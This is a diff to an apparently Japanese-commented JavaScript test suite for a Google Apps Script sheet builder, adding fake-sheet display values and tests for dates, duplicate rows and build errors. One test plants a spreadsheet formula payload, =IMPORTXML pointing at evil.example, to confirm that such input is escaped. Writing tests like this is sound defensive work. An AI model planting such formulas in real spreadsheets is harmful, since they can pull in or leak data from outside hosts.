@@ -252,11 +252,20 @@ function makeWideSheet(rows) {
           for (let r = row - 1; r < row - 1 + numRows; r++) {
             const src = data[r] || [];
             const line = [];
-            for (let c = col - 1; c < col - 1 + (numCols || 1); c++) line.push(src[c] || "");
+            for (let c = col - 1; c < col - 1 + (numCols || 1); c++) line.push(src[c] === undefined ? "" : src[c]);
             out.push(line);
           }
           return out;
         },
+        // ★ 実物と同じく、表示の文字列で返す（日付は表示の形・数値は文字列）。
+        getDisplayValues: () =>
+          rng.getValues().map((line) =>
+            line.map((v) =>
+              v instanceof Date
+                ? `${v.getFullYear()}/${String(v.getMonth() + 1).padStart(2, "0")}/${String(v.getDate()).padStart(2, "0")}`
+                : String(v)
+            )
+          ),
       };
       return rng;
     },
@@ -2780,14 +2789,64 @@ function readyWithFormUrls(extra) {
   );
 }
 {
-  // ⚠️★ 数式として解釈される値を無害化する
+  // ⚠️★ 読み戻した値が `=` で始まる文字列だった場合の防御（★ 実物では数式は表示値で読まれるので、
+  //   ここは「表示値が `=` で始まる」場合の守り。⚠️ 偽シートは文字列をそのまま返す）
   const ctx = readyWithFormUrls();
   ctx.refreshO1LinksTab();
   const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
   const memo = sh.__grid.findIndex((r) => r[0] === "メモ");
   sh.__grid[memo][1] = '=IMPORTXML("https://evil.example","//a")';
   ctx.refreshO1LinksTab();
-  push("§18★ 手で入れた欄の数式は文字列に倒す（先頭に '）", String(linksValue(ctx, "メモ")).indexOf("'=") === 0, { v: linksValue(ctx, "メモ") });
+  push("§18★ 読み戻した値が `=` で始まっても数式として書き戻さない（先頭に '）", String(linksValue(ctx, "メモ")).indexOf("'=") === 0, { v: linksValue(ctx, "メモ") });
+}
+{
+  // ★ 日付は表示の形のまま引き継ぐ（⚠️ getValues だと "Thu Oct 08 2026 …" に化ける）
+  const ctx = readyWithFormUrls();
+  ctx.refreshO1LinksTab();
+  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
+  const memo = sh.__grid.findIndex((r) => r[0] === "メモ");
+  sh.__grid[memo][1] = new Date(2026, 9, 8);
+  ctx.refreshO1LinksTab();
+  push("§18★ 手で入れた日付は表示の形（2026/10/08）で保つ", linksValue(ctx, "メモ") === "2026/10/08", { v: linksValue(ctx, "メモ") });
+}
+{
+  // ★ 同じ項目名の行が複数あれば、空でない最初の値を採る（⚠️ コピーした空の行で消さない）
+  const ctx = readyWithFormUrls();
+  ctx.refreshO1LinksTab();
+  const sh = ctx.__sheets[MGMT_ID][LINKS_TAB];
+  const memo = sh.__grid.findIndex((r) => r[0] === "メモ");
+  sh.__grid[memo][1] = "最初";
+  sh.__grid.push(["メモ", "", "手動", ""]);
+  sh.__grid.push(["メモ", "後ろ", "手動", ""]);
+  ctx.refreshO1LinksTab();
+  push(
+    "§18★ 同じ項目名が複数: 空でない最初の値を採り、重複をログに出す",
+    linksValue(ctx, "メモ") === "最初" && ctx.__logs.some((l) => /「メモ」の行が複数/.test(l)),
+    { v: linksValue(ctx, "メモ") }
+  );
+  const c2 = readyWithFormUrls();
+  c2.refreshO1LinksTab();
+  const s2 = c2.__sheets[MGMT_ID][LINKS_TAB];
+  const m2 = s2.__grid.findIndex((r) => r[0] === "メモ");
+  s2.__grid[m2][1] = "";
+  s2.__grid.push(["メモ", "下に書いた", "手動", ""]);
+  c2.refreshO1LinksTab();
+  push("§18 同じ項目名が複数: 最初が空なら下の値を採る", linksValue(c2, "メモ") === "下に書いた", { v: linksValue(c2, "メモ") });
+}
+{
+  // ⚠️★★ リンク集が作れなくても、buildO1MgmtSheet はログのタブを用意し、作れていないと肯定形で言う
+  const ctx = readyWithFormUrls({ noMgmtSheet: true });
+  ctx.__sheets[MGMT_ID] = {};
+  ctx.o1BuildLinksTab_ = () => {
+    throw new Error("stub: links failed");
+  };
+  const r = attempt(() => ctx.buildO1MgmtSheet());
+  push(
+    "§18★★ リンク集が投げても build は止まらず、ログ 2 枚はでき、「作れていません」と言う",
+    !r.threw && !!ctx.__sheets[MGMT_ID][MGMT_TAB] && !!ctx.__sheets[MGMT_ID][MGMT_REJECT_TAB] &&
+      ctx.__logs.some((l) => /作れていません/.test(l)),
+    { threw: r.threw, message: r.message }
+  );
 }
 {
   // ⚠️★★★ 「参加者ロスター」タブを持つ表には書かない
@@ -2841,9 +2900,9 @@ cases.forEach((c) => {
 //   ★ 45 のままだと実数 89 に対して**半分近く削っても緑**で、「削られていないか」を測れていない。
 // ⚠️★ 実数に近づけて保つ（★ 2026-09-03: §13〜§16 を足して 221 件なので下限 215）。
 //   ⚠️ 離れたままだと「テストが 13 件消えても気づかない」状態になる。
-if (cases.length < 235) {
+if (cases.length < 240) {
   console.log(
-    `\n${cases.length} 件しかケースが無い（235 未満）。テストが削られていないか確認すること。`
+    `\n${cases.length} 件しかケースが無い（240 未満）。テストが削られていないか確認すること。`
   );
   process.exit(1);
 }
